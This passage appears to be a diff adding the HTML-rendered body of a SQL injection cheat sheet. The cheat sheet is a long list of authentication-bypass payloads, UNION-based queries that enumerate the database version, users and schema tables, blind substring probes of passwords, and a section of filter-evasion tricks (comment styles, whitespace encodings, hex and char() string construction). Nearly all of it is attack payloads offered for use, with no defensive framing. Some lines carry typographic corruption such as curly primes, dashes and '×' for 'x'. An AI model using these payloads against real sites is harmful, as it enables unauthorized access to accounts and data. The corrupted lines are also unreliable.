+</span><span class="s1">admin&#34;) or (&#34;1&#34;=&#34;1
+</span><span class="s1">admin&#34;) or (&#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">admin&#34;) or (&#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">admin&#34;) or (&#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">admin&#34;) or &#34;1&#34;=&#34;1
+</span><span class="s1">admin&#34;) or &#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">admin&#34;) or &#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">admin&#34;) or &#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">1234 &#34; AND 1=0 UNION ALL SELECT &#34;admin&#34;, &#34;81dc9bdb52d04dc20036dbd8313ed055
+</span><span class="s1">==
+</span><span class="s1">=
+</span><span class="s1">&#39;</span>
+<span class="s1">&#39; --
+</span><span class="s1">&#39;</span> <span class="c1">#</span>
+<span class="s1">&#39; –
+</span><span class="s1">&#39;</span>--
+<span class="s1">&#39;/*
+</span><span class="s1">&#39;</span><span class="c1">#</span>
+<span class="s2">&#34; --
+</span><span class="s2">&#34;</span> <span class="c1">#</span>
+<span class="s2">&#34;/*
+</span><span class="s2">&#39; and 1=&#39;1
+</span><span class="s2">&#39; and a=&#39;a
+</span><span class="s2"> or 1=1
+</span><span class="s2"> or true
+</span><span class="s2">&#39; or &#39;&#39;=&#39;
+</span><span class="s2">&#34;</span> or <span class="s2">&#34;&#34;</span><span class="o">=</span><span class="s2">&#34;
+</span><span class="s2">1′) and &#39;1′=&#39;1–
+</span><span class="s2">&#39; AND 1=0 UNION ALL SELECT &#39;&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
+</span><span class="s2">&#34;</span> AND <span class="nv">1</span><span class="o">=</span><span class="m">0</span> UNION ALL SELECT <span class="s2">&#34;&#34;</span>, <span class="s2">&#34;81dc9bdb52d04dc20036dbd8313ed055
+</span><span class="s2"> and 1=1
+</span><span class="s2"> and 1=1–
+</span><span class="s2">&#39; and &#39;one&#39;=&#39;one
+</span><span class="s2">&#39; and &#39;one&#39;=&#39;one–
+</span><span class="s2">&#39; group by password having 1=1--
+</span><span class="s2">&#39; group by userid having 1=1--
+</span><span class="s2">&#39; group by username having 1=1--
+</span><span class="s2"> like &#39;%&#39;
+</span><span class="s2"> or 0=0 --
+</span><span class="s2"> or 0=0 #
+</span><span class="s2"> or 0=0 –
+</span><span class="s2">&#39; or         0=0 #
+</span><span class="s2">&#39; or 0=0 --
+</span><span class="s2">&#39; or 0=0 #
+</span><span class="s2">&#39; or 0=0 –
+</span><span class="s2">&#34;</span> or <span class="nv">0</span><span class="o">=</span><span class="m">0</span> --
+<span class="s2">&#34; or 0=0 #
+</span><span class="s2">&#34;</span> or <span class="nv">0</span><span class="o">=</span><span class="m">0</span> –
+%<span class="s1">&#39; or &#39;</span>0<span class="s1">&#39;=&#39;</span><span class="m">0</span>
+ or <span class="nv">1</span><span class="o">=</span><span class="m">1</span>
+ or <span class="nv">1</span><span class="o">=</span>1--
+ or <span class="nv">1</span><span class="o">=</span>1/*
+ or <span class="nv">1</span><span class="o">=</span>1#
+ or <span class="nv">1</span><span class="o">=</span>1–
+<span class="s1">&#39; or 1=1--
+</span><span class="s1">&#39;</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1
+</span><span class="s1">&#39;</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>--
+<span class="s1">&#39; or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;/*
+</span><span class="s1">&#39;</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="c1">#</span>
+<span class="s1">&#39; or &#39;</span>1′<span class="o">=</span><span class="s1">&#39;1
+</span><span class="s1">&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span>
+<span class="s1">&#39; or 1=1 --
+</span><span class="s1">&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> –
+<span class="s1">&#39; or 1=1--
+</span><span class="s1">&#39;</span> or <span class="nv">1</span><span class="o">=</span>1<span class="p">;</span><span class="c1">#</span>
+<span class="s1">&#39; or 1=1/*
+</span><span class="s1">&#39;</span> or <span class="nv">1</span><span class="o">=</span>1#
+<span class="s1">&#39; or 1=1–
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1--
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>--
+<span class="s1">&#39;) or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;/*
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="c1">#</span>
+<span class="s1">&#39;) or (&#39;</span>1<span class="s1">&#39;=&#39;</span><span class="m">1</span>
+<span class="s1">&#39;) or (&#39;</span>1<span class="s1">&#39;=&#39;</span>1--
+<span class="s1">&#39;) or (&#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;--
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="o">(</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>/*
+<span class="s1">&#39;) or (&#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;#
+</span><span class="s1">&#39;</span>or<span class="s1">&#39;1=1
+</span><span class="s1">&#39;</span>or<span class="s1">&#39;1=1′
+</span><span class="s1">&#34; or &#34;1&#34;=&#34;1
+</span><span class="s1">&#34; or &#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">&#34; or &#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">&#34; or &#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">&#34; or 1=1
+</span><span class="s1">&#34; or 1=1 --
+</span><span class="s1">&#34; or 1=1 –
+</span><span class="s1">&#34; or 1=1--
+</span><span class="s1">&#34; or 1=1/*
+</span><span class="s1">&#34; or 1=1#
+</span><span class="s1">&#34; or 1=1–
+</span><span class="s1">&#34;) or &#34;1&#34;=&#34;1
+</span><span class="s1">&#34;) or &#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">&#34;) or &#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">&#34;) or &#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">&#34;) or (&#34;1&#34;=&#34;1
+</span><span class="s1">&#34;) or (&#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">&#34;) or (&#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">&#34;) or (&#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">) or &#39;</span>1′<span class="o">=</span><span class="s1">&#39;1–
+</span><span class="s1">) or (&#39;</span>1′<span class="o">=</span><span class="s1">&#39;1–
+</span><span class="s1">&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> LIMIT 1<span class="p">;</span><span class="c1">#</span>
+<span class="s1">&#39;or 1=1 or &#39;&#39;=&#39;</span>
+<span class="s2">&#34;or 1=1 or &#34;&#34;=&#34;</span>
+<span class="s1">&#39; or &#39;</span>a<span class="s1">&#39;=&#39;</span>a
+<span class="s1">&#39; or a=a--
+</span><span class="s1">&#39;</span> or <span class="nv">a</span><span class="o">=</span>a–
+<span class="s1">&#39;) or (&#39;</span>a<span class="s1">&#39;=&#39;</span>a
+<span class="s2">&#34; or &#34;</span>a<span class="s2">&#34;=&#34;</span>a
+<span class="s2">&#34;) or (&#34;</span>a<span class="s2">&#34;=&#34;</span>a
+<span class="s1">&#39;) or (&#39;</span>a<span class="s1">&#39;=&#39;</span>a and hi<span class="s2">&#34;) or (&#34;</span>a<span class="s2">&#34;=&#34;</span>a
+<span class="s1">&#39; or &#39;</span>one<span class="s1">&#39;=&#39;</span>one
+<span class="s1">&#39; or &#39;</span>one<span class="s1">&#39;=&#39;</span>one–
+<span class="s1">&#39; or uid like &#39;</span>%
+<span class="s1">&#39; or uname like &#39;</span>%
+<span class="s1">&#39; or userid like &#39;</span>%
+<span class="s1">&#39; or user like &#39;</span>%
+<span class="s1">&#39; or username like &#39;</span>%
+<span class="s1">&#39; or &#39;</span>x<span class="s1">&#39;=&#39;</span>x
+<span class="s1">&#39;) or (&#39;</span>x<span class="s1">&#39;=&#39;</span>x
+<span class="s2">&#34; or &#34;</span>x<span class="s2">&#34;=&#34;</span>x
+<span class="s1">&#39; OR &#39;</span>x<span class="s1">&#39;=&#39;</span>x<span class="s1">&#39;#;
+</span><span class="s1">&#39;</span><span class="o">=</span><span class="s1">&#39; &#39;</span>or<span class="s1">&#39; and &#39;</span><span class="o">=</span><span class="s1">&#39; &#39;</span>or<span class="s1">&#39;
+</span><span class="s1">&#39;</span> UNION ALL SELECT 1, @@version<span class="p">;</span><span class="c1">#</span>
+<span class="s1">&#39; UNION ALL SELECT system_user(),user();#
+</span><span class="s1">&#39;</span> UNION <span class="k">select</span> table_schema,table_name FROM information_Schema.tables<span class="p">;</span><span class="c1">#</span>
+admin<span class="s1">&#39; and substring(password/text(),1,1)=&#39;</span><span class="m">7</span>
+<span class="s1">&#39; and substring(password/text(),1,1)=&#39;</span><span class="m">7</span>
+<span class="s1">&#39; or 1=1 limit 1 -- -+
+</span><span class="s1">&#39;</span><span class="o">=</span><span class="s2">&#34;or&#39;
+</span></code></pre></div><h3 id="sql-injection-bypass-filter">SQL injection bypass filter</h3>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">###</span><span class="w"> </span><span class="n">Comments</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="p">,</span><span class="w">
+</span><span class="w"></span><span class="c1">-- ,
+</span><span class="c1"></span><span class="cm">/**/</span><span class="p">,</span><span class="w"> 
+</span><span class="w"></span><span class="o">#</span><span class="p">,</span><span class="w">
+</span><span class="w"></span><span class="c1">--+,
+</span><span class="c1">--  -,
+</span><span class="c1"></span><span class="p">;</span><span class="c1">--a 
+</span><span class="c1"></span><span class="o">###</span><span class="w"> </span><span class="k">Prefix</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="o">~</span><span class="w"> </span><span class="o">!</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39; or –+2=- -!!!&#39;</span><span class="mi">2</span><span class="w">
+</span><span class="w"> </span><span class="o">###</span><span class="w"> </span><span class="k">Operator</span><span class="p">:</span><span class="w">
+</span><span class="w"></span><span class="o">^</span><span class="p">,</span><span class="w"> </span><span class="o">=</span><span class="p">,</span><span class="w"> </span><span class="o">!=</span><span class="p">,</span><span class="w"> </span><span class="o">%</span><span class="p">,</span><span class="w"> </span><span class="o">/</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="p">,</span><span class="w"> </span><span class="o">|</span><span class="p">,</span><span class="w"> </span><span class="o">||</span><span class="p">,</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;=</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;=</span><span class="p">,</span><span class="w"> </span><span class="p">,,</span><span class="w"> </span><span class="n">XOR</span><span class="p">,</span><span class="w"> </span><span class="n">DIV</span><span class="p">,</span><span class="w"> </span><span class="k">LIKE</span><span class="p">,</span><span class="w"> </span><span class="n">SOUNDS</span><span class="w"> </span><span class="k">LIKE</span><span class="p">,</span><span class="w"> </span><span class="n">RLIKE</span><span class="p">,</span><span class="w"> </span><span class="n">REGEXP</span><span class="p">,</span><span class="w"> </span><span class="n">LEAST</span><span class="p">,</span><span class="w"> </span><span class="n">GREATEST</span><span class="p">,</span><span class="w"> </span><span class="k">CAST</span><span class="p">,</span><span class="w"> </span><span class="k">CONVERT</span><span class="p">,</span><span class="w"> </span><span class="k">IS</span><span class="p">,</span><span class="w"> </span><span class="k">IN</span><span class="p">,</span><span class="w"> </span><span class="k">NOT</span><span class="p">,</span><span class="w"> </span><span class="k">MATCH</span><span class="p">,</span><span class="w"> </span><span class="k">AND</span><span class="p">,</span><span class="w"> </span><span class="k">OR</span><span class="p">,</span><span class="w"> </span><span class="nb">BINARY</span><span class="p">,</span><span class="w"> </span><span class="k">BETWEEN</span><span class="p">,</span><span class="w"> </span><span class="k">ISNULL</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Spaces</span><span class="w">
+</span><span class="w"></span><span class="o">%</span><span class="mi">20</span><span class="w"> </span><span class="o">%</span><span class="mi">09</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="n">b</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="k">c</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="w"> </span><span class="o">%</span><span class="n">a0</span><span class="w"> </span><span class="cm">/**/</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;or+(1)sounds/**/like&#34;1&#34;–%a0-
+</span><span class="s1">&#39;</span><span class="k">union</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="n">tabe_name</span><span class="p">,(</span><span class="mi">3</span><span class="p">)</span><span class="k">from</span><span class="o">`</span><span class="n">information_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">tables</span><span class="o">`</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">quoted</span><span class="w"> </span><span class="n">string</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;a&#34;</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">n</span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">b</span><span class="s1">&#39;1100001′
+</span><span class="s1">SELECT _binary&#39;</span><span class="mi">1100001</span><span class="err">′</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">x</span><span class="s1">&#39;61&#39;</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Unquoted</span><span class="w"> </span><span class="n">string</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="err">×</span><span class="mi">616263</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x61</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="mi">0</span><span class="n">x6162</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unhex</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="w">    </span><span class="o">#</span><span class="w"> </span><span class="n">unhex</span><span class="p">(</span><span class="mi">6162</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">97</span><span class="w">  </span><span class="p">)</span><span class="o">#</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">98</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">61</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="o">#</span><span class="w"> 
+</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span><span class="o">#</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="k">Alias</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">alias</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">pass</span><span class="o">`</span><span class="k">alias</span><span class="w"> </span><span class="k">alias</span><span class="o">`</span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w">
+</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">###</span><span class="w"> </span><span class="n">Font</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39; or true = &#39;</span><span class="mi">1</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">round</span><span class="p">(</span><span class="n">pi</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="k">true</span><span class="o">+</span><span class="k">true</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="k">true</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="k">Operator</span><span class="w"> </span><span class="n">fonts</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;b&#39;</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;b&#39;</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="k">false</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Seriously</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;=&#34;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
+</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ascii</span><span class="w"> </span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">load_file</span><span class="cm">/*foo*/</span><span class="p">(</span><span class="mi">0</span><span class="err">×</span><span class="mi">616263</span><span class="p">)</span><span class="w">
+</span><span class="w"> </span><span class="n">Construction</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">functions</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unhex</span><span class="p">(</span><span class="mi">616263</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">99</span><span class="p">)</span><span class="w">
+</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">61</span><span class="w">
+</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="w">
+</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;ABC&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">),</span><span class="n">conv</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">),</span><span class="n">conv</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span><span class="w">
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Extracted</span><span class="w"> </span><span class="k">substring</span><span class="w"> </span><span class="n">substr</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">substr</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">substring</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">substring</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">mid</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">mid</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">lpad</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="k">space</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">rpad</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="k">space</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">reverse</span><span class="p">(</span><span class="k">right</span><span class="p">(</span><span class="n">reverse</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">insert</span><span class="p">(</span><span class="k">insert</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">space</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span><span class="mi">2</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="k">space</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">space</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">trim</span><span class="p">(</span><span class="k">version</span><span class="p">()</span><span class="k">from</span><span class="p">(</span><span class="k">version</span><span class="p">()))</span><span class="w">
